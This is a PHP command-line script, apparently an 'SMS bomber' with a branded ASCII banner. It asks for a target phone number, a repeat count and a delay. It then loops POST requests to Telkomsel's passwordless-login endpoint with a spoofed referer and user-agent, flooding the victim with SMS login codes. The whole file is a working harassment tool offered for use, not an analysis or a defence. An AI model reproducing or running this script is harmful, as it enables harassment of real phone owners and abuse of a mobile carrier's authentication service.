<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "\e[1;34m";
echo "__  __     ___            ____        _   _____
\ \/ /___ / _ \ _ __ ___ | __ ) _   _| |_|___ /
 \  // __| | | | '_ ` _ \|  _ \| | | | __| |_ \
 /  \ (__| |_| | | | | | | |_) | |_| | |_ ___) |
/_/\_\___|\___/|_| |_| |_|____/ \__, |\__|____/
                                |___/ \n";
echo "\e[1;31m";
echo "_______________Tools By Xc0mbyt3 \n";
echo "\n";
echo "\e[1;34m";
echo "╭──────────────────────────────────────[INFO]\n";
echo "╰# Author : Xc0mByt3 \n";
echo "   Email  : xcombyte@gmail.com \n";
echo "   Github : https://github.com/Xc0mByt3 \n";
echo "\n";
echo "\e[1;31m";
echo "╭───[NOMOR TARGET]\n";
echo "╰# ";
$nomor = trim(fgets(STDIN));

echo "\n";
echo "╭───[JUMLAH]\n";
echo "╰# ";
$jumlah = trim(fgets(STDIN));


echo "\n";
echo "╭───[DELAY]\n";
echo "╰# ";


$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>
